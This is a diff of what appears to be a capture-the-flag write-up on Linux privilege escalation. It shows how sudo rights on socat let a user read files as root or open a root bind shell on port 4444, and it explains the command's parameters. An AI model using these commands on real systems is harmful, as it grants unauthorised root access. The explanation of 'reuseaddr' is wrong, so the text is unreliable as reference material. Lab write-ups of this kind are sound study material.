@@ -245,14 +245,18 @@ we are part of the groups "adm cdrom sudo dip plugdev lxd lpadmin sambashare"
 and we do have a permission to sudo on the socat program (very similar to netcat but with a different syntax)
  
 a quick search on the web and i found this line of code: "socat TCP4-LISTEN:4444,reuseaddr  OPEN:[$file]"
-(alternatively we can use this line to get a permanent shell and OWN the machine "sudo socat TCP4-LISTEN:4444,reuseaddr  SYSTEM:/bin/sh")
+(alternatively we can use this line to get a Shell and OWN the machine "sudo socat TCP4-LISTEN:4444,reuseaddr  SYSTEM:/bin/sh")
 
 ### socat TCP4-LISTEN:4444,reuseaddr  OPEN:[$file]
 >TCP4-LISTEN =       use ipv4 listiner
-4444 =                        our port (simmilarly to netcat)
-reuseaddr =              use this user machine ip address
-OPEN: =                    part of the socat abillitis to open files (use 'SYSTEM' to execute files)
-[$file] =                     the file we want to read
+
+>4444 =                        our port (simmilarly to netcat)
+
+>reuseaddr =              use this user machine ip address
+
+>OPEN: =                    part of the socat abillitis to open files (use 'SYSTEM' to execute files)
+
+>[$file] =                     the file we want to read
 
 our syntax will be as follow (dont forget 'sudo' to run this proccess as root)
  
